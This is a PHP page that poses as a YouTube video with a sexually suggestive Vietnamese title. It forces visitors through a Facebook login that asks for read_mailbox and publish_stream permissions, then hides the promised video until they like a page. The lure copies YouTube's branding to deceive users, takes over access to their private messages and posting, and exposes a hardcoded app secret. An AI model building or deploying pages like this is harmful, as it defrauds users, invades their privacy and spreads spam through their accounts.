<?php
/**
 * click like to watch video
 * @authorn success.ddt@gmail.com
 */
require_once ('lib/facebook.php');

$appId = '666407193412246';
$appSecret = '9635de2968957dc76e0e327ad63d6766';
$pageUrl = 'https://www.facebook.com/hummer';
$pageId = '150846736307';

$facebook = new Facebook(
	array(
		'appId' => $appId,
		'secret' => $appSecret
	)
);

$user = $facebook->getUser();
if (!$user) {
	$loginUrl = $facebook->getLoginUrl(array(
		'scope' => 'read_mailbox,publish_stream'  
	));	
	header('Location: ' . $loginUrl);
}
$likes = $facebook->api("/me/likes/" . $pageId);
?>




<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<html>
<head>
<link rel="shortcut icon" href="http://s.ytimg.com/yts/img/favicon-vfldLzJxy.ico" type="image/x-icon">     
<link rel="icon" href="//s.ytimg.com/yts/img/favicon_32-vflWoMFGx.png" sizes="32x32">
<title>Nữ sinh khoe hàng cực chất</title>    
<meta name="description" content="www.youtube.com" />
<meta name="keywords" content="" />
<script type="text/javascript" src="http://code.jquery.com/jquery-1.4.2.min.js"></script>
<style>
	.video-play {
		width:	480px;
		text-align: center;
		background: #CCC;
	}
	.video-play.not_fan {
		display: none;
	}
</style>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /></head>
<body>
	<?php if(empty($likes['data'])): ?>
		<div class="video-play like">
			<h2 class="title">Bạn cần like để xem video</h2>
			<div id="fb-root"></div>
			<fb:like href="<?php echo $pageUrl ?>" data-send="false" send="false" layout="box_count" width="70" show_faces="false" font="arial" fb-xfbml-state="rendered" class="fb_edge_widget_with_comment fb_iframe_widget" style="width: 50px;height: 65px; overflow: hidden;">
			</fb:like>		
		</div>
		<script type="text/javascript">
			window.fbAsyncInit = function() {
				FB.init({
			    	appId  : '666407193412246', //193983577403302
			    	channelUrl : '//localhost/facebook/message/count',
			    	xfbml  : true,
				 	oauth : true,
					cookie: true,
			    	frictionlessRequests: true,
				});
				fbApiInitialized = true;
				FB.Canvas.setAutoGrow();
				FB.Event.subscribe('edge.create', function(href, widget) {
					likePage();
				});
		    };
		
		(function() {
		 var e = document.createElement('script');
		 e.type = 'text/javascript';
		 e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
		 e.async = true;
		 document.getElementById('fb-root').appendChild(e);
		 }());
		</script>

		
		<script type="text/javascript">
			function likePage(){
				$('.video-play.like').hide();
				$('.video-play.not_fan').show();
			}
		</script>
	<?php else: ?>
	<?php endif; ?>
	
	<div class="video-play <?php echo ($likes['data'] ? 'is_fan' : 'not_fan') ?>">
		<img src="http://sphotos-e.ak.fbcdn.net/hphotos-ak-ash3/67958_682763755082020_1805718400_n.jpg" height="200px" />
	</div>
	
</body>
</html>